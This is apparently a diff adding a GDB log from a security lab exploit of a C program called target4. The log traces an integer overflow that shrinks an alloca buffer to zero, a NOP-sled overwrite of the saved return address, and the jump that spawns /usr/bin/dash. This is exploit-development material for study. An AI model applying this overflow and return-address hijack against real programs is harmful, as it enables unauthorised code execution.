@@ -1,0 +1,40 @@
+Breakpoint 1 at 0x804a181: file target4.c, line 31.
+Breakpoint 2 at 0x804a193: file target4.c, line 31.
+Breakpoint 3 at 0x804a19d: file target4.c, line 32.
+
+[1] target4: read_file() before read_elements()
+read_file EBP = 0xfff6ba48
+count = [EBP-0x14] = 0x40000000
+buf   = [EBP-0x10] = 0xfff6ba20
+saved EIP slot = EBP+4 = 0xfff6ba4c (original 0x0804a1eb)
+GDB: count * 4 overflows to 0x00000000, so alloca is effectively 0
+
+[2] target4: AFTER read_elements() returns
+buf = 0xfff6ba20   count = 0x90909090
+buffer words (index 0..15):
+0xfff6ba20:	0x90909090	0x90909090	0x90909090	0x90909090
+0xfff6ba30:	0x90909090	0x90909090	0x90909090	0x90909090
+0xfff6ba40:	0x90909090	0x90909090	0x90909090	0xfff6bb5c
+0xfff6ba50:	0x90909090	0x90909090	0x90909090	0x90909090
+word 11 (offset 44) at 0xfff6ba4c = 0xfff6bb5c
+read_file saved EIP slot 0xfff6ba4c contains 0xfff6bb5c
+
+[3] target4: read_file() ret
+ESP = 0xfff6ba4c
+ret will pop = 0xfff6bb5c
+0xfff6ba4c:	0xfff6bb5c	0x90909090	0x90909090	0x90909090
+bytes at target address:
+0xfff6bb5c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
+0xfff6bb64:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
+instruction at target:
+   0xfff6bb5c:	nop
+process 7156 is executing new program: /usr/bin/dash
+/tmp/target4.gdb:45: Error in sourced command file:
+Warning:
+Cannot insert breakpoint 1.
+Cannot access memory at address 0x804a181
+Cannot insert breakpoint 2.
+Cannot access memory at address 0x804a193
+Cannot insert breakpoint 3.
+Cannot access memory at address 0x804a19d
+
